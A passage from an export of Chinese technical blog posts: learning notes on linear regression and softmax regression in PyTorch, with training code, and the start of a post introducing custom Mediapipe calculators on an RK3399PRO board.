  在2019年下半年，随着我移植模型的工作深入，接触的各种硬件平台越来越多，经常遇见一些层在此平台无法移植，需要拆出来特殊处理。这让我产生了为啥这些层在这些特定平台不能够移植的疑问？为啥替换为别的层就能正常工作？为啥此平台不提供这个层？于是我去请教我们的算法小伙伴们，他们建议我如果要解决这个问题，建议我学习一下DL的基本知识，至少要简单了解从数据采集及处理、模型搭建及训练、模型部署等知识，其中模型部署可能是我最了解的内容了。利用一些闲暇时间和工作中的一些机会，我对以上需要了解的知识有了一个大概的认知。随着了解的深入，可能我也大概知道我比较缺一些基础知识。经过小伙伴的推荐和自己的搜索，我选择了《动⼿学深度学习.pdf》作为我的基础补全资料。
  本文是以‘补全资料’的Chapter3中线性规划为基础来编写的，主要是对‘补全资料’之前的基础知识的一个简单汇总，包含了深度学习中一些基本的知识点，同时会对这些基本知识点进行一些解释。
  由于我也是一个初学者，文中的解释是基于我的知识水平结构做的‘特色适配’，如果解释有误，请及时提出，我这里及时更正。写本文的原因也是记录我的学习历程，算是我的学习笔记。




回归概念

  回归是一种建模方法，得到的模型表示了自变量和因变量的关系。因此回归还可以解释为一种事与事之间的联系。对我们来说最常见的例子就是我们学习过的函数。例如函数Y=aX+b，这里的Y=aX+b就是我们模型， X代表自变量，Y代表因变量。
  这里顺便多说一句，深度学习是机器学习的子集。建模方法很多，回归只是其中的一种。


线性回归
  线性回归就是自变量和因变量是线性关系，感觉跟废话一样，换个方式表达就是自变量是一次。例如：Y=aX+b, Y=aX1+bX2+c, 这里的X、X1、X2都是一次的，不是二次或者更高的。


非线性回归
  非线性回归就是自变量和因变量不是是线性关系，同样感觉跟废话一样，换个方式表达就是自变量是二次及以上的。这里和线性回归对比一下就行。




基于y=aX12+bX12+cX2+dX2+e的回归Pytorch实例

  此实例是《动⼿学深度学习.pdf》中线性回归的从零实现的变种。从零实现，可以了解到许多的基本知识。
  此小节基本按照数据采集及处理、模型搭建及训练和模型部署来描述。


带噪声数据采集及处理
  我们知道，在我们准备数据时，肯定由于各种各样的原因，会有各种干扰，导致我们根据实际场景采集到的数据，其实不是精准的，但是这并不影响我们建模，因为我们的模型是尽量去拟合真实场景的情况。
  生成我们的实际模型的噪声数据，也就是我们常见的数据集的说法。如下是代码：
import numpy as np
def synthetic_data(w1, w2, b, num_examples): #@save
    """⽣成y = X1^2w1 + X2w2 + b + 噪声。"""
    # 根据正太分布，随机生成我们的X1和X2
    # X1和X2都是(1000, 2)的矩阵
    X1 = np.random.normal(0, 1, (num_examples, len(w1)))
    X2 = np.random.normal(0, 1, (num_examples, len(w2)))

    # 基于X1,X2,true_w1, true_w2, true_b， 通过向量内积、广播等方法计算模型的真实结果
    y = np.dot(X1**2, w1) + np.dot(X2, w2) + b

    # 通过随机噪声加上真实结果，生成我们的数据集。
    # y是(1000, 1)的矩阵
    y += np.random.normal(0, 0.1, y.shape)
    
    return X1, X2, y.reshape((-1, 1))
    
true_w1 = np.array([5.7, -3.4])
true_w2 = np.array([4.8, -3.4])
true_b = 4.2

# 这里我们得到了我们的数据集，包含了特征和标签
features1, features2, labels = synthetic_data(true_w1, true_w2, true_b, 1000)

# 因为我们知道我们的模型是y=aX1^2+bX1^2+cX2+dX2+e，于是我们知道a的数据分布是类似y=ax^2+b的这种形状。于是我们知道c的数据分布是类似y=ax+b的这种形状。
# 我们可以通过如下代码验证一下
plt.scatter(features1[:, 0], labels[:], 1, c='r')
plt.scatter(features2[:, 0], labels[:], 1, c='b')
plt.show()

    
        
    
   
其实从图中可以看到，红色的是类似y=ax^2+b的这种形状，蓝色是类似y=ax+b这种形状，但是他们都不是在一条线，说明我们的设置的噪声项是有效的。
  同时这里我们还要准备一个函数用来随机抽取特征和标签，一批一批的进行训练。
def data_iter(batch_size, features1, features2, labels):
    num_examples = len(features1)
    indices = list(range(num_examples))
    np.random.shuffle(indices) # 样本的读取顺序是随机的
    
    for i in range(0, num_examples, batch_size):
        j = np.array(indices[i: min(i + batch_size, num_examples)])
        # print(features1.take(j, axis=0).shape)
        yield torch.tensor(features1.take(j, 0)), torch.tensor(features2.take(j, 0)), torch.tensor(labels.take(j)) # take函数根据索引返回对应元素


模型搭建及训练
  对于我们这个实例来说，模型就是一个二元二次函数，此外这里的模型也叫作目标函数。所以，下面我们用torch来实现它就行。
def our_func(X1, X2, W1, W2, B):
    # print(X1.shape) (100, 2)
    # print(W1.shape) (2, 1)
    net_out = torch.matmul(X1**2, W1) + torch.matmul(X2, W2) + B
    # print(net_out.shape) (100, 1)
    return net_out
注意哟，这里的X1,X2,W1,W2,B都是torch的tensor格式。
  由数据采集及处理可知，在我们设定的真实true_w1,true_w2和true_b的情况下，我们得到了许许多多的X1,X2和y。我们要做的事情是求出W1、W2和b，这里看起是不是很矛盾？我们已知了true_w1,true_w2,true_b然后去求w1,w2,b。这里其实是一个错觉，由于在实际情况中，我们可能会得到许许多多的X1,X2和y，这些数据不是我们模拟生成的，而是某种关系实际产生的数据，只是这些数据被我们收集到了。在实际情况下，而且我们仅仅只能够得到X1,X2和y，我们通过观察X1,X2和y的关系，发现他们有一元二次和一元一次关系，所以我们建立的模型为y=aX12+bX12+cX2+dX2+e，这个过程称为建模。
  通过上面的说明，我们知道这个模型我们要求a,b,c,d,e这些参数的值，我们求这些参数的过程叫做训练。对于这个实例来说，这个过程也叫作求解方程，这里其实我们可以通过解方程的方法把这5个参数解出来，但是在实际情况中，我们建立的模型可能参数较多，可能手动解不出来，于是我们要通过训练的方式，去拟合这些参数。所以这里一个重要的问题就是怎么拟合这些参数？
  如果学习过《数值分析》这门课程的话，其实就比较好理解了，如果要拟合这些参数，我们有许多的方法可以使用，但是基本分为两类，一类是针对误差进行分析，一类是针对模型进行分析。那么在深度学习中，我们一般是对误差进行分析，也就是我们常说的梯度下降法，我们需要随机生成这些参数初始值(w1,w2,b)，然后根据我们得到的X1,X2和y，通过梯度下降方法可以得到新的w1’,w2’,b’，且w1’,w2’,b’更加接近true_w1,true_w2和true_b。这就是一种优化过程，经过多次优化，我们就有可能求出跟接近与true_w1,true_w2和true_b的值。
  上面啰嗦了一大堆之后，我这里正式引入损失函数这个概念，然后我们根据损失函数去优化我们的w1,w2,b。我们定义这个实例的损失函数如下：
def loss_func(y_train, y_label):
    # print(y_train.shape)
    # print(y_label.shape)
    return ((y_train - y_label)**2)/2
  这里我们y_train就是我们得到的训练值，y_label就是我们采集到数值，这里的损失函数就是描述训练值和标签的差多少，那么我们只需要让这个损失函数的值越来越小就行，那么可能问题就变成了求损失函数的极小值问题，我们在这里还是用梯度下降的方法来求损失函数的极小值。
  这里要回忆起来一个概念，梯度是一个函数在这个方向增长最快的方向。我们求损失函数的极小值的话，就减去梯度就行了。
  这里还要说一句，损失函数有很多(L1,MSE,交叉熵等等)，大家以后可以自己选一个合适的即可，这里的合适需要大家去学习每种损失函数的适用场景。这里的平方损失的合理性我个人认为有两种：


1 直观法，平方损失函数描述的是在数据集上，训练值和真实值的误差趋势，我要想得到的参数最准确，就要求误差最小，误差最小就要求我去求解损失函数的极小值，这是我所了解的数学知识的直观反映。 （直觉大法）


2 数学证明如下：我们生成数据或者采样数据的时候，他们的误差服从正态分布（ $P(x) = 1/\sqrt{2\pi\sigma2}*exp((-1/2\sigma2)(x-\mu)^2)$ ），于是我们根据条件概率得到特定feature得到特定y的概率为: $P(y|X) = 1/\sqrt{2\pi\sigma2}*exp((-1/2\sigma2)(y-w1X12-w2X2-b)2)$,根据最大似然估计$P(y|X) = \prod\limits_{i=0}{n-1}P(y{i}|X^{i})$，此时最大似然估计最大，w1,w2,b就是最佳的参数，但是乘积函数的最大值不好求，我们用对数转换一下，变为各项求和，只需要保证含义一致就行。由于一般的优化一般是说最小化，所以我们要取负的对数和$-\log(P(y|X))$，此时我们把最大似然估计函数转换为对数形式：$-\log(P(y|X)) = \sum\limits_{i=0}{n-1}1/2\log(2\pi\sigma2)+1/2\sigma2(y-w1X12-w2X2-b)^2)$,我们可以看到要求此函数的最小值，其实就是后半部分的平方是最小值就行，因为其余的都是常数项，而后面部分恰好就是我们的平方损失函数。（Copy书上大法）


  这里的梯度下降法就是(w1,w2,b)-lr*(w1,w2,b).grad/batch_size,代码如下：
def sgd(params, lr, batch_size): #@save
    """⼩批量随机梯度下降。"""
    for param in params:
        with torch.no_grad():
            param[:] = param - lr * param.grad / batch_size
  这里我画出我们的损失函数的三维图像,我们把损失函数简化为Z=aX^2+bY+c的形式。其图像如下图：

    
        
    
   
我们可以看到这个曲面有很多极小值，当我们随机初始化a,b,c的时候，我们会根据X和Y得到部分损失点，这时我们求出a,b,c的梯度，当我们对a,b,c减去偏导数时，就会更快的靠近损失函数的谷底，我们的当我们的损失函数到极小值时，我们就认为此时的a,b,c是我们要找的参数。这就是我们的梯度下降法的意义所在。
  下面就直接写训练代码就行。
w1 = torch.tensor(np.random.normal(0, 0.5, (2, 1)), requires_grad=True)
w2 = torch.tensor(np.random.normal(0, 0.5, (2, 1)), requires_grad=True)
b = torch.tensor(np.ones(1), requires_grad=True)

# print(w1.grad)
# print(w1.grad_fn)
# 
lr = 0.001
num_epochs = 10000
net = our_func
loss = loss_func

batch_size = 200

for epoch in range(num_epochs):
    for X1, X2, y in data_iter(batch_size, features1, features2, labels):
        # print(X1.shape) (100, 2)
        # print(y.shape) (100, 1)
        l = loss(net(X1, X2, w1, w2, b), y.reshape(batch_size, 1)) # `X`和`y`的⼩批量损失
        # print(f'epoch &#123;epoch + 1&#125;, before sdg loss &#123;float(l.mean()):f&#125;')
        # 计算l关于[`w`, `b`]的梯度
        # print(l.shape)
        
        # l.backward() default call, loss.backward(torch.Tensor(1.0))
        w1.grad = None
        w2.grad = None
        b.grad = None

        l.backward(torch.ones_like(y.reshape(batch_size, 1)))

        sgd([w1, w2, b], lr, batch_size) # 使⽤参数的梯度更新参数
        
        l1 = loss(net(X1, X2, w1, w2, b), y.reshape(batch_size, 1)) # `X`和`y`的⼩批量损失
        # print(f'epoch &#123;epoch + 1&#125;, after sdg loss &#123;float(l1.mean()):f&#125;')
    
    train_l = loss(net( torch.from_numpy(features1), torch.from_numpy(features2), w1, w2, b), torch.from_numpy(labels))
    # print(train_l.sum())
    if (epoch % 1000 == 0):
        print(f'epoch &#123;epoch + 1&#125;, loss &#123;float(train_l.mean()):f&#125;')

print('train_w1 ',w1)
print('train_w2 ',w2)
print('train_b ',b)

  这里做的事情就是首先设定训了次数，学习率，批次数量参数，然后随机生成了w1,w2,b，然后通过data_iter取一批数据，算出loss，清空w1,w2,b的梯度，对loss求w1,w2,b的偏导数，调用sdg求新的w1,w2,b。最后计算新参数在整个数据集上的损失。
  这里尤其需要注意的是在多次迭代过程中，一定要清空w1,w2,b的梯度，因为它的梯度是累加的，不会覆盖。这里用的Pytorch的自动求导模块，其实底层就是调用的bp算法，利用了链式法则，反向从loss开始，能够算出w1,w2,b的偏导数。

    
        
    
   
这里我们看到最终的平均误差到了一定值后就下降不了，这和我们的数据有关系，我们只需要关心这个误差我们能够接受吗？能接受，我们就训练得到了成功的模型，如果不能接受，我们就改参数重新来，这是一个多次试验尝试的过程。
  我们从上文可知，true_w1 = np.array([5.7, -3.4])，true_w2 = np.array([4.8, -3.4])，true_b = 4.2。我们训练出来的值是w1=(5.7012, -3.3955),w2=(4.8042, -3.4071),b=4.2000。可以看到其实训练得到的值还是非常接近的，但是这个任务其实太简单了。




后记

  这里主要用到了许多基本的概念，一个是数据集的收集和处理，模型搭建，模型训练，优化方法、损失函数等等。至少通过本文，我们知道了得到一个模型的基本过程，其实普遍性的深度学习就是使用新的损失函数、搭建新的模型、使用新的优化方法等等。
  从文中特例我们可以发现，我们只利用了Pytorch自带的自动求导模块，其他的一些常见的深度学习概念都是我们手动实现了，其实这些好多内容都是Pytorch这些框架封装好的，我们没有必要自己手写，但是如果是初次学习的话，建议手动来写，这样认知更加深刻。
参考文献


https://github.com/d2l-ai/d2l-zh/releases (V1.0.0)


https://github.com/d2l-ai/d2l-zh/releases (V2.0.0 alpha1)







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
        <category>计算机视觉</category>
      </categories>
      <tags>
        <tag>平方损失</tag>
        <tag>Pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title>DL基础补全计划(二)---Softmax回归及示例（Pytorch，交叉熵损失）</title>
    <url>/2021/07/11/blog_idx_106/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Windows 10


VSCode


Python 3.8.10


Pytorch 1.8.1


Cuda 10.2


前言

  在《DL基础补全计划(一)—线性回归及示例（Pytorch，平方损失）》（https://blog.csdn.net/u011728480/article/details/118463588 ）一文中我们对深度学习中的非常基础的知识进行了简单介绍，按照常见深度学习中的基本流程设计了一个简单的线性模型。同时，基于基本的语法，展示了数据收集，数据小批量随机获取，网络forward, loss设计，基于loss的bp，随机小批量梯度下降，模型训练，模型预测等基本的流程。 记录这篇文章的原因也很简单，为了将自己从学校里面带出来的知识和深度学习中的基础知识关联起来，不要出现大的断层和空洞。
  在上文我们提到，我们已经能够设计一类模型能够求解特定函数的数值，但是在实际应用场景中，我们还有一些问题主要还是关注他们的分类。比如我们有一堆数据，怎么把他们分为N类。这里就要介绍深度学习中一类常见的模型，softmax回归模型。本文的主要目的就是基于FashionMNIST数据集（60000 * 28 * 28 训练集，10000 * 28 * 28 测试集），从基础的语法开始设计一个softmax分类模型，并介绍一些softmax相关的重点，在本文之后，其实我们就可以做一些深度学习的简单分类任务了。




Softmax介绍及实例

  我们可以知道，Softmax这个函数其实就是对N个类别进行打分，输出N个类别的概率，那么它的实际底层工作原理到底是什么呢？
  假如我们定义输出类别为N，输入特征为X, 输出类别分数为Y，参数为W，偏置为b，那么我们可以设计一个函数为：$Y=WX+b$，W.shape是(N, len(X)), X.shape是(len(X), 1)， b.shape 是(N, len(X))，Y.shape是(N , 1)，通过这样的一个线性运算后，我们就可以将len(X)个输入变换为N个输出，其实这个时候的N个输出就是我们不同类别的分数，理论上来说，我们就可以用这个当做每个类别的分数或者说概率。由于这里的Y是实数范围，有正有负，有大有小，存在数据不稳定性，而且我们需要把输出的类别当做概率使用，这里如果存在负数的话，不满足概率的一些定义。因此我们在经过一个线性变换后，再通过softmax运算，才能够将这些分数转换为相应的概率。
  Y.shape是(N , 1)，Softmax定义为：$Softmax(Yi)=exp(Yi)/\sum\limits_{j=0}^{N-1}Yj$ ，因此我们可以通过Softmax得到每个类别的分数。$Y’=Softmax(Y)$，通过这样的运算后，就把Y归一化到0~1，而且满足概率的一些定义和保持了和Y同样的性质。
  下面我们基于FashionMNIST数据集（此数据集有10个类别，60000个训练集，10000个测试集，图片为单通道28*28），设计一个简单的分类模型。下面是python需要导入的依赖
from numpy.core.numeric import cross
import torch
from torch.utils.data import Dataset
from torchvision import datasets
from torchvision.transforms import ToTensor
import matplotlib.pyplot as plt
from torch.utils.data import DataLoader
import numpy as np


获取并处理FashionMNIST数据集
  通过Pytorch的设计好的api直接获取数据集，并得到解析后的数据
def LoadFashionMNISTByTorchApi():
    # 60000*28*28
    training_data = datasets.FashionMNIST(
        root="data",
        train=True,
        download=True,
        transform=ToTensor()
    )

    # 10000*28*28
    test_data = datasets.FashionMNIST(
        root="data",
        train=False,
        download=True,
        transform=ToTensor()
    )

    labels_map = &#123;
        0: "T-Shirt",
        1: "Trouser",
        2: "Pullover",
        3: "Dress",
        4: "Coat",
        5: "Sandal",
        6: "Shirt",
        7: "Sneaker",
        8: "Bag",
        9: "Ankle Boot",
    &#125;
    figure = plt.figure(figsize=(8, 8))
    cols, rows = 3, 3
    for i in range(1, cols * rows + 1):
        sample_idx = torch.randint(len(training_data), size=(1,)).item()
        img, label = training_data[sample_idx]
        figure.add_subplot(rows, cols, i)
        plt.title(labels_map[label])
        plt.axis("off")
        plt.imshow(img.squeeze(), cmap="gray")
    plt.show()
    return training_data, test_data

    
        
    
    
  通过面的代码可以知道，datasets.FashionMNIST()返回的是集合，集合里面存的是每个图的数据以及其标签。这里其实Pytorch帮我们做了解析工作，实际FashionMNIST的二进制存储格式如下，我们也可以自己写代码按照此规则解析数据集，这里就不关注这个问题了。
'''
Image:
[offset] [type]          [value]          [description]
0000     32 bit integer  0x00000803(2051) magic number
0004     32 bit integer  60000            number of images
0008     32 bit integer  28               number of rows
0012     32 bit integer  28               number of columns
0016     unsigned byte   ??               pixel
0017     unsigned byte   ??               pixel
........
xxxx     unsigned byte   ??               pixel
'''

'''
Label：
[offset] [type]          [value]          [description]
0000     32 bit integer  0x00000801(2049) magic number (MSB first)
0004     32 bit integer  60000            number of items
0008     unsigned byte   ??               label
0009     unsigned byte   ??               label
........
xxxx     unsigned byte   ??               label
The labels values are 0 to 9.
'''
  还记得我们前文的随机小批量怎么实现的吗？首先随机打乱数据集中的每个数据（图片和标签为一个数据）的顺序，然后根据batch_size参数构造一个可迭代的对象返回出来，最后训练的时候我们通过for xx in data_iter 来访问这一批的数据。这里我们也不需要自己来写这个了，直接调用Pytorch的函数来生成这样的一个data_iter，我们应该把更多注意力放到其他地方去。代码如下：
training_data, test_data = LoadFashionMNISTByTorchApi()
batch_size = 200

# 返回训练集和测试集的可迭代对象
train_dataloader = DataLoader(training_data, batch_size, shuffle=True)
test_dataloader = DataLoader(test_data, batch_size, shuffle=True)


设计网络
  我们的网络由两个部分构成，一个是从28*28到10的一个映射函数，一个是softmax函数。我们定义一个$Y=WX+b, Y’=Softmax(Y)$，因此我们可以看到，我们所需要学习的参数有W和b。
  根据前文介绍，我们可以知道Y’/Y.shape是(10, 1), X.shape是(784, 1), W.shape是(10, 784), b.shape(10, 1)
def softmax(out):
    # example:
    # out = (p1, p2, p3)
    # set Sum=p1+p2+p3
    # softmax(out) = (p1/Sum, p2/Sum, p3/Sum)
    exp_out = torch.exp(out)
    partition = exp_out.sum(dim=1, keepdim=True)
    return exp_out/partition

def my_net(w, b, X):
    # print(X.shape)
    # print(w.shape)
    # print(b.shape)
    liear_out = torch.matmul(X, w) + b
    # print(liear_out.shape)
    return softmax(liear_out)


设计Loss函数及优化函数
  在前文的线性回归中，我们使用了平方误差来作为Loss函数，在分类这一问题里面，我们需要引入交叉熵来作为Loss函数。交叉熵作为信息论中的概念，我们简单的通过几个前置知识来引入：


信息论研究的是一个随机事件携带的信息量，基本思想是事件发生概率越大，所携带的信息量越小。因此这里可以引入一个自信息定义：$I(x)=-\log_{2}(P(x))$。通过这个定义我们可以得到同样的趋势，一个事件发生的概率越小，携带的信息量越大。


熵(Entropy)，自信息是对单个随机事件的信息量大小描述，我们需要定义来描述整个随机分布的信息量大小的描述。假设随机分布是离散的，熵的定义为：$H(X)=-\sum\limits_{i=0}^{n-1}P(Xi)\log_{2}(P(Xi))$


KL差异（Kullback-Leibler (KL) divergence），主要就是用来描述两个分布的差异。因为在有些时候，一个概率分布很复杂，我们可以用一个简单的概率分布来替代，但是我们需要知道这两个分布的差异。定义原概率分布为P(X),近似概率分布为Q(X)，假如X是离散随机变量，KL差异定义为：$D_{KL}(P(X)||Q(X))=\sum\limits_{i=0}{n-1}P(Xi)\log_{2}(P(Xi)/Q(Xi))=\sum\limits_{i=0}{n-1}P(Xi)[\log_{2}(P(Xi)) - \log_{2}(Q(Xi))]$


交叉熵（cross-entropy），交叉熵定义为：$H(P,Q)=-\sum\limits_{i=0}^{n-1}P(Xi)\log_{2}(Q(Xi))$，我们可以看到$H(P,Q)=H(P)+D_{KL}(P||Q)$。


在上文中，我们一步一步引出了交叉熵，这个时候，我们来看为什么在深度学习中可以引入交叉熵作为Loss函数，对于特定的一组Feature，我们可以通过标签得到这组feature代表什么，相当于其概率为1，因此在原概率分布上面，$P(Xi)=1, H(Xi)=0$，我们可以看到这个时候交叉熵和KL差异是相等的，那么交叉熵其实就是描述我们训练时得到的概率分布和原分布的差异。因此，在分类问题中我们得到的是当前的每个分类的概率，那么我们分别求每个分类当前概率分布相对于原分布的KL差异，那么我们就知道我们的训练参数和真实参数的差异。我们求交叉熵的最小值，也就代表我们参数越接近真实值。


# 信息论，熵，kl熵（相对），交叉熵
def cross_entropy(y_train, y_label):
    # l = -y*log(y')
    
    # print(y_train.shape)
    # print(y_label.shape)
    # print(y_train)
    # print(y_label)
    # print(y_train[0][:].sum())
    # call pick
    my_loss = -torch.log(y_train[range(len(y_train)), y_label])
    # nll_loss = torch.nn.NLLLoss()
    # th_loss = nll_loss(torch.log(y_train), y_label)
    # print(my_loss.sum()/len(y_label))
    # print(th_loss)
    return my_loss


设计准确率统计函数以及评估准确率函数
  在前一小节，我们已经设计了损失函数，我们在训练的过程中，除了要关注损失函数的值外，还需要关注我们模型的准确率。
  模型的准确率代码如下：
def accuracy(y_train, y_label): #@save
    """计算预测正确的数量。"""
    # y_train = n*num_class
    if len(y_train.shape) > 1 and y_train.shape[1] > 1:
        # argmax get the max-element-index
        y_train = y_train.argmax(axis=1)

    # cmp = n*1 , eg: [0 0 0 1 1 1 0 0 0]
    # print(y_train.dtype)
    # print(y_label.dtype)
    cmp = y_train == y_label
    return float(cmp.sum()/len(y_label))
  从上面的代码可以知道，我们的网络输出是当前feature在每个类别上的概率，因此我们求出网络输出中，概率最大的索引，和真实label进行对比，相等就代表预测成功一个，反之。我们对最终数据求和后除以batch_size，就可以得到在batch_size个特征中，我们的预测正确的个数占比是多少。
  我们还需要在指定的数据集上评估我们的准确率，其代码如下（就是分批调用获得准确率后求平均）：
def evaluate_accuracy(net, w, b, data_iter): #@save
    """计算在指定数据集上模型的精度。"""
    test_acc_sum = 0.0
    times = 1
    for img, label in data_iter:
        test_acc_sum += accuracy(net(w, b, img.reshape(-1, w.shape[0])), label)
        times += 1

    return test_acc_sum/times


设计预测函数
  预测函数就是在特定数据上面，通过我们训练的网络，求出类别，并与真实label进行对比，其代码如下：
def predict(net, w, b, test_iter, n=6): #@save
    """预测标签（定义⻅第3章）。"""
    for X, y in test_iter:
        break
    labels_map = &#123;
        0: "T-Shirt",
        1: "Trouser",
        2: "Pullover",
        3: "Dress",
        4: "Coat",
        5: "Sandal",
        6: "Shirt",
        7: "Sneaker",
        8: "Bag",
        9: "Ankle Boot",
    &#125;
    trues = [labels_map[i] for i in y.numpy()]
    preds = [labels_map[i] for i in net(w, b, X.reshape(-1, w.shape[0])).argmax(axis=1).numpy()]
    for i in np.arange(n):
        print(f'pre-idx &#123;i&#125; \n true_label/pred_label: &#123;trues[i]&#125;/&#123;preds[i]&#125;')


训练模型
  训练模型的话，其实就是将上面的代码缝合起来。代码如下：
if __name__ == '__main__':
    training_data, test_data = LoadFashionMNISTByTorchApi()
    
    batch_size = 200
    train_dataloader = DataLoader(training_data, batch_size, shuffle=True)
    test_dataloader = DataLoader(test_data, batch_size, shuffle=True)

    # train_features, train_labels = next(iter(train_dataloader))
    # print(f"Feature batch shape: &#123;train_features.size()&#125;")
    # print(f"Labels batch shape: &#123;train_labels.size()&#125;")
    # img = train_features[1].squeeze()
    # label = train_labels[1]
    # plt.imshow(img, cmap="gray")
    # plt.show()
    # print(f"Label: &#123;label&#125;")

    # 28*28
    num_inputs = 784
    
    # num of class
    num_outputs = 10

    # (748, 10)
    w = torch.from_numpy(np.random.normal(0, 0.01, (num_inputs, num_outputs)))
    w = w.to(torch.float32)
    w.requires_grad = True
    print('w = ', w.shape)

    # (10, 1)
    b = torch.from_numpy(np.zeros(num_outputs))
    b = b.to(torch.float32)
    b.requires_grad = True
    print('b = ', b.shape)




    num_epochs = 10
    lr = 0.1

    net = my_net

    loss = cross_entropy

    # if torch.cuda.is_available():
    #     w = w.to('cuda')
    #     b = b.to('cuda')

    for epoch in range(num_epochs):
        times = 1
        train_acc_sum = 0.0
        train_loss_sum = 0.0
        for img, label in train_dataloader:
            # if torch.cuda.is_available():
            #     img = img.to('cuda')
            #     label = label.to('cuda')            
            # print(img.shape, label.shape)
            l = loss(net(w, b, img.reshape(-1, w.shape[0])), label)
            # print(l.shape)
            # print(l)

            # clean grad of w,b
            w.grad = None
            b.grad = None 

            # bp
            l.backward(torch.ones_like(l))

            # update param
            sgd([w, b], lr, batch_size)

            train_acc_sum += accuracy(net(w, b, img.reshape(-1, w.shape[0])), label)
            train_loss_sum += (l.sum()/batch_size)
            times += 1

            # break
        
        test_acc = evaluate_accuracy(net, w, b, test_dataloader)

        print('epoch = ', epoch)
        print('train_loss = ', train_loss_sum.detach().numpy()/times)
        print('train_acc = ', train_acc_sum/times)
        print('test_acc = ', test_acc)

        # break
    
    # predict
    predict(net, w, b, test_dataloader, n = 10)
  从如上的代码可知，首先从数据集中得到小批量数据迭代器，然后随机生成初始化参数，最后在小批量数据上推理，求loss之，bp，更新参数，记录loss和acc，最终训练次数完了后，去预测。
  训练截图如下：

    
        
    
 
  预测截图如下：

    
        
    
 
&emsp;&emsp;从预测的截图来看，预测成功的准确率大于1/10。说明我们的模型的有效的。此图中看起来准确率较高，这是偶然现象，但是真实不应该这样的，因为在测试集上，准确率只有81%左右。




后记

  此外，我们这里仅仅是按照数学定义来做计算，在计算机中，我们现在设计的一些函数可能不合理，比如softmax会产生溢出，我们会用到LogExpSum技巧，把softmax和交叉熵一起计算，通过冥函数和对数函数的一些性质，我们可以化简后抵消一些exp的计算，保证数值的稳定性，我们只需要知道有这么一个事情即可。但是这一切都不需要我们来弄，我们只需要调用别人设计的好的函数即可，比如pythorch中的torch.nn.CrossEntropyLoss()。如果真的有需要，可以根据LogExpSum的定义来直接编写就行，在这里，本文就不关注这个。
  从线性回归到softmax回归，我们算是基本了解清楚了深度学习的一些基本的概念，这为我们去看和改一些比较好的、公开的模型打下了基础。
参考文献


https://github.com/d2l-ai/d2l-zh/releases (V1.0.0)


https://github.com/d2l-ai/d2l-zh/releases (V2.0.0 alpha1)


https://d2l.ai/chapter_appendix-mathematics-for-deep-learning/information-theory.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
        <category>计算机视觉</category>
      </categories>
      <tags>
        <tag>Pytorch</tag>
        <tag>Softmax</tag>
      </tags>
  </entry>
  <entry>
    <title>Mediapipe 在RK3399PRO上的初探（二）(自定义Calculator)</title>
    <url>/2021/04/24/blog_idx_104/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Ubuntu 18.04


gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)


RK3399PRO 板卡


前言

  本文有一篇前置文章为《Mediapipe 在RK3399PRO上的初探（一）(编译、运行CPU和GPU Demo, RK OpenglES 填坑，编译bazel)》 https://blog.csdn.net/u011728480/article/details/115838306 ，本文是在前置文章上的一点点探索与发现。
  在前置文章中，我们介绍了一些编译和使用Mediapipe的注意事项，也初步跑起来了一点点demo，算是对这个框架有了一个初步的认知。但是前置文章也说了，了解这个框架的意义是替换我们小组现有的框架，而且能够支撑我们的板卡产品。于是我们还需要一个最最最最最最重要的功能就是“Custormer Calculator”，就是自定义计算节点，因为这个框架的核心就是计算节点。下文我们将会讲到这个框架的一些基本概念，这些概念都是来至于官方文档的机翻+我自己的理解。同时，我会给出一个我定义的计算节点的实例，算是给大家一个感性认知。




Mediapipe的一些概念（本小节基本来至于官方文档的机翻+我自己的理解，不感兴趣，请直接看下一小节）

  本小节内容，主要参考 https://github.com/google/mediapipe/tree/master/docs/framework_concepts 的几个介绍概念的md文件。
  MediaPipe 感觉中文直译为“媒体管道”，为啥会有这个名字呢？因为它把数据+处理组合成一个计算节点，然后把一个一个节点连接起来，用数据来驱动整个核心逻辑。如果大家对Caffe、ncnn类似的框架源码有一点点了解的话，就会觉得他们非常像，但是又不像。像是说，都是通过配置文件定义计算节点逻辑图，然后通过运算，得到我们想得到的逻辑图中节点的数据。不像的话，就是说的是Mediapipe的调度机制了，极大的增加了节点计算的并行功能，而那些框架是按照图节点的上下顺序进行执行的。
  上面这段话可能有点抽象，我想表达的就是 Mediapipe 就是把任何一个“操作”都可以变为一个Calculator，因为我们的每一个项目的逻辑抽象出来都是 Calculator0+Data0-&gt;Calculator1+Data1-&gt;Calculator2+Data2-&gt;… …，然后，Mediapipe 做的是基于这种calculator的调度和执行。这里我举个栗子：


人脸图+检测算法=人脸检测结果，这是一个Calculator


RTSP流+解码模块=解码之后的图片，这是一个Calculator


好了，其他的就不过分的解读了，下面就使用MediaPipe的helloworld example（ https://github.com/google/mediapipe/blob/master/mediapipe/examples/desktop/hello_world/hello_world.cc ）为例，简单的说说以下几个概念。


Packet
  Packet，是mediapipe中的数据单元，它可以接收任意类型的数据。也是mediapipe中的数据流动单元。就是在mediapipe中，我们设计的Graph中，所有的逻辑流动都是通过packet流动来实现的。
  实例代码片段：
//MakePacket&lt;std::string>("Hello World!") 创建一个packet，顺带说一句，我不喜欢这里的宏，不利于维护
MP_RETURN_IF_ERROR(graph.AddPacketToInputStream("in", MakePacket&lt;std::string>("Hello World!").At(Timestamp(i))));

//从packet中获取数据
mediapipe::Packet packet;
packet.Get&lt;std::string>();


Graph
  Graph是由各个Calculator组成的，可以直接把Calculator理解为数据结构中图的节点。而Graph直接把他当做图就行了。Graph是我们定义的逻辑流程的具体载体，也就是说我们的业务逻辑是什么样子的，那么Graph里面就会有相应的逻辑流程。可以具备多输入输出。
  实例代码片段：
CalculatorGraph graph;


